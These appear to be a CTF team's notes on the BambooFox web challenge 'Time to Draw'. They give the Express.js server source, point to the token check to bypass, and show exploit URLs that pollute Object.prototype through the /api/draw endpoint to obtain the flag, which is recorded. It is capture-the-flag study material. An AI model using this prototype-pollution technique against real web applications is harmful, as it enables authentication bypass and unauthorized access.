## Time to Draw
> **Category:** Web
> **Description:** 
> **Pad Link:** http://34.87.94.220/pad/web-time-to-draw
> **Flag:**
---

http://chall.ctf.bamboofox.tw:8787/

## Source code
```javascript=
const express = require("express");
const cookieParser = require('cookie-parser')
var crypto = require('crypto');
const secret = require("./secret");

const app = express();
app.use(cookieParser(secret.FLAG));

let canvas = {
    ...Array(128).fill(null).map(() => new Array(128).fill("#FFFFFF"))
};

const hash = (token) => crypto.createHash('sha256').update(token).digest('hex');

app.get('/', (req, res) => {
    if (!req.signedCookies.user)
        res.cookie('user', { admin: false }, { signed: true });

    res.sendFile(__dirname + "/index.html");
});

app.get('/source', (_, res) => {
    res.sendFile(__filename);
});

app.get('/api/canvas', (_, res) => {
    res.json(canvas);
});

app.get('/api/draw', (req, res) => {
    let { x, y, color } = req.query;
    if (x && y && color) canvas[x][y] = color.toString();
    res.json(canvas);
});

app.get('/promote', (req, res) => {
    if (req.query.yo_i_want_to_be === 'admin')
        res.cookie('user', { admin: true }, { signed: true });
    res.send('Great, you are admin now. <a href="/">[Keep Drawing]</a>');
});

app.get('/flag', (req, res) => {
    let userData = { isGuest: true };
    if (req.signedCookies.user && req.signedCookies.user.admin === true) {
        userData.isGuest = false;
        userData.isAdmin = req.cookies.admin;
        userData.token = secret.ADMIN_TOKEN;
    }

    if (req.query.token && req.query.token.match(/[0-9a-f]{16}/) &&
        hash(`${req.connection.remoteAddress}${req.query.token}`) === userData.token)
        res.send(secret.FLAG);
    else
        res.send("NO");
});

app.listen(3000, "0.0.0.0");
```

```javascript=
req.query.token && req.query.token.match(/[0-9a-f]{16}/) && hash(`${req.connection.remoteAddress}${req.query.token}`) === userData.token
```
Need to bypass this line mainly ><

## References


## Bugs


## Exploit Ideas
standard prototype pollution chall
~~~
http://chall.ctf.bamboofox.tw:8787/api/draw?x=__proto__&y=token&color=put_the_sha256_hex_in_lowercase_here(%3Cyour%20ip%3E0123456789abcdef)
http://chall.ctf.bamboofox.tw:8787/flag?token=0123456789abcdef

flag{baby.__proto__.pollution.js}
~~~

## Scripts

